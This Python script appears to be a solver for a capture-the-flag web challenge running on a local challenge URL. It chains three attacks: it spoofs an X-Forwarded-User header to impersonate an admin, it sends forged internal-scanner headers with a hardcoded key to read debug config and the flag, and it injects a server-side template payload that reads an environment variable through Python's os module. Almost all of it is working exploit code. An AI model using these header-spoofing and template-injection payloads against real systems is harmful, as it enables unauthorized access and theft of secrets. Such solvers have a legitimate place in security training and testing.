#!/usr/bin/env python3
import json
import os
import sys
import time
from urllib.parse import urljoin

import requests


def discover_base_url():
    # Expect environment or fall back to localhost: dynamic deployment should pass this in
    base = os.environ.get("CHALLENGE_URL", "http://127.0.0.1:8080/")
    if not base.endswith("/"):
        base += "/"
    return base


def check_profile(base):
    r = requests.get(urljoin(base, "profile"))
    print("[+] Anonymous profile:", r.json())


def exploit_header_impersonation(base):
    headers = {"X-Forwarded-User": "admin"}
    r = requests.get(urljoin(base, "admin"), headers=headers)
    print("[+] Header-impersonated /admin status:", r.status_code, r.text)


def abuse_internal_scanner_headers(base):
    headers = {
        "X-Internal-Scanner": "internal-scanner",
        "X-Scanner-Key": "INT-SCAN-KEY-123",
        "User-Agent": "VulnScanner/1.0",
    }
    # First, hit debug/config to confirm internal access
    r_conf = requests.get(urljoin(base, "debug/config"), headers=headers)
    print("[+] /debug/config as scanner:", r_conf.status_code, r_conf.text)

    # Then hit /admin/flag with same internal-scanner identity
    r_flag = requests.get(urljoin(base, "admin/flag"), headers=headers)
    print("[+] /admin/flag as scanner:", r_flag.status_code, r_flag.text)
    try:
        j = r_flag.json()
        return j.get("flag")
    except Exception:
        return None


def exploit_ssti(base):
    headers = {"X-Forwarded-User": "admin"}
    payload = "Hello {{ __import__('os').getenv('CTF_FLAG') }}"
    r = requests.get(urljoin(base, "admin/render"), params={"template": payload}, headers=headers)
    print("[+] SSTI render response:", r.status_code, r.text)


def main():
    base = discover_base_url()
    print("[+] Using base URL:", base)

    check_profile(base)
    exploit_header_impersonation(base)
    exploit_ssti(base)

    flag = abuse_internal_scanner_headers(base)
    if flag:
        print("[+] Retrieved flag:", flag)
    else:
        print("[-] Failed to retrieve flag")
        sys.exit(1)


if __name__ == "__main__":
    main()
